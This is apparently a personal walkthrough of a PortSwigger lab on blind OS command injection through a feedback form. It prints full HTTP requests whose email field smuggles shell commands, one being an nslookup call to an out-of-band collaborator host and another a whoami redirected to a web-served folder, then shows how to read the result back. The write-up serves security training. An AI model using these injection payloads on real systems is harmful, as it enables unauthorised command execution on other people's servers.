## Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

```
/var/www/images/
```

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output.

## Notes

- /feedback
- /image?filename=X


## Resume

1. Capture a `/feedback` request
2. Inject OS command payload
3. Execute a whoami and save the output to `/var/www/images/`


## Solve 

First step is to capture a `/feedback` request : 

```
POST /feedback/submit HTTP/2
Host: 0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Cookie: session=jacmxZuPcoWPha6LMWKrwGUKcu7uMsPO
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=jmHHjFRAB9DKQLCUYQHnCNiwuXka02lN&name=toto&email=toto%40toto.com&subject=toto&message=toto
```

Then try to RCE on one of the two parameters : 

```
POST /feedback/submit HTTP/2
Host: 0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Cookie: session=jacmxZuPcoWPha6LMWKrwGUKcu7uMsPO
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=jmHHjFRAB9DKQLCUYQHnCNiwuXka02lN&name=toto&email=toto%40toto.com||nslookup fwfpw44iivjmg5i9klno5vz19sfj3br0.oastify.com||&subject=toto&message=toto
```

The answer : 

```
HTTP/2 500 Internal Server Error
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

"Could not save"
```

We can see that on our collaborator we have two **DNS** request that confirm we were able to **RCE**. We can now update the payload using `&email=toto%40toto.com||whoami>/var/www/images/whoami.txt||` : 

```
POST /feedback/submit HTTP/2
Host: 0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Cookie: session=jacmxZuPcoWPha6LMWKrwGUKcu7uMsPO
Content-Length: 95
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3f0091038921ea80d8b3f600e700ef.web-security-academy.net/feedback
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

csrf=jmHHjFRAB9DKQLCUYQHnCNiwuXka02lN&name=toto&email=toto%40toto.com||whoami>/var/www/images/whoami.txt||&subject=toto&message=toto
```

In order to access to output we can go on any **product** page. On the image right click and open in a new window and modify the path from `/image?filename=4.jpg` to `/image?filename=whoami.txt`. 